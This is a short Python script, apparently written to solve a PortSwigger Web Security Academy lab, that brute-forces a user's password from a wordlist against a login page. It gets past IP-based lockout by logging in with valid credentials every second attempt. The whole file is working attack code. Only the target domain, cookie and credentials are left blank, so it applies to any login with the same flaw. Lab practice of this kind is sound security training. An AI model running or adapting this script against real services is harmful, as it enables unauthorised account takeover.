# This script was written to complete the lab https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block. 
#   The server locks the IP on multiple login attempsts but can be bypassed with a genuine login in beetween requests


import requests
from bs4 import BeautifulSoup


def main():
  DOMAIN = ""
  URL = f"https://{DOMAIN}/login"
  SESSION_COOKIE = ""
  USERNAME_TO_BRUTE = ""
  VALID_USERNAME = ""
  VALID_PASSWORD = ""

  passwords_file = open("passwords.txt", "r")
  passwords = passwords_file.read().split("\n")
  passwords_file.close()

  headers = {"Cookie": f"session={SESSION_COOKIE}"}

  print("testing passwords...")

  attempts = 0
  for password in passwords:
    if int(attempts%2) == 0:
      params = {"username": VALID_USERNAME, "password": VALID_PASSWORD}
      response = requests.post(URL, headers = headers, data = params)
    
    params = {"username": USERNAME_TO_BRUTE, "password": password}
    response = requests.post(URL, headers = headers, data = params)
    soup = BeautifulSoup(response.text, 'html.parser')
    if soup.find('p', attrs={"class" : "is-warning"}) == None:
      print(f"found credentials: {USERNAME_TO_BRUTE}:{password}")
      return
    attempts += 1
  
  print("could not find the password...")


if __name__ == "__main__":
  main()
